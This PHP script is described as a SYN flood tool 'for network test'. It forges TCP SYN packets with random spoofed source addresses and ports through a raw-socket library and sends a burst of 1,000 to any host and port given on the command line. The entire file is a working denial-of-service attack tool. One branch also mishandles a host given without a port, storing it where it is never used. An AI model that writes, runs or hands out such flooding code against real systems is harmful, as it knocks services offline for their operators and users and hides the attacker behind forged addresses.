<?php

	/* A simple SYN Flood tool for network test
	 *
	 * PRNL library is required for raw network access
	 * [PHP Raw Network Library] https://github.com/MartijnB/PRNL
	*/

	@error_reporting(E_ALL ^ E_NOTICE ^ E_DEPRECATED ^ E_WARNING ^ E_STRICT);
	
	include_once "PRNL".DIRECTORY_SEPARATOR."lib".DIRECTORY_SEPARATOR."lib.prnl.php";
	
	$target_ip = gethostbyname("localhost");
	$target_port = 80;
	
	if (isset($_SERVER["argv"][1])) {
		
		if (strpos($_SERVER["argv"][1], ":") !== false) {
			$target = explode(":", $_SERVER["argv"][1]);
			$target_ip = gethostbyname($target[0]);
			$target_port = (int)$target[1];
		} else {
			$host = gethostbyname($_SERVER["argv"][1]);
		}
		
	}
	
	$packet_count = 0;
	while ($packet_count < 1000) {
		
		$network = new RawIPNetwork();
		$ip_packet = new IPv4ProtocolPacket();
		$tcp_packet = new TCPProtocolPacket();
		
		$network->createIPSocket(PROT_IPv4, PROT_TCP);
		$random_ip = rand(0, 255).".".rand(0, 255).".".rand(0, 255).".".rand(0, 255);
		$random_port = rand(1, 65535);
		
		$ip_packet->setIdSequence(0);
		$ip_packet->setOffset(0);
		$ip_packet->setTTL(255);
		$ip_packet->setProtocol(PROT_TCP);
		$ip_packet->setSrcIP($random_ip);
		$ip_packet->setDstIP($target_ip);
		
		$tcp_packet->setSrcPort($random_port);
		$tcp_packet->setDstPort($target_port);
		//$tcp_packet->setSegmentOffset();
		$tcp_packet->setWindowSize(rand(10000,90000));
		$tcp_packet->setData("");
		$tcp_packet->setFlags(ITCP::FLAG_SYN);
		
		$ip_packet->setData($tcp_packet);
		$ip_packet->completePacket();
		
		$network->sendPacket($ip_packet);
		
		echo $random_ip.":".$random_port." => ".$target_ip.":".$target_port." [SYN]".PHP_EOL;
		
		$packet_count++;
		
	}
	
	echo "Total ".$packet_count." packets sent".PHP_EOL;
	echo "Aborting...".PHP_EOL;
		
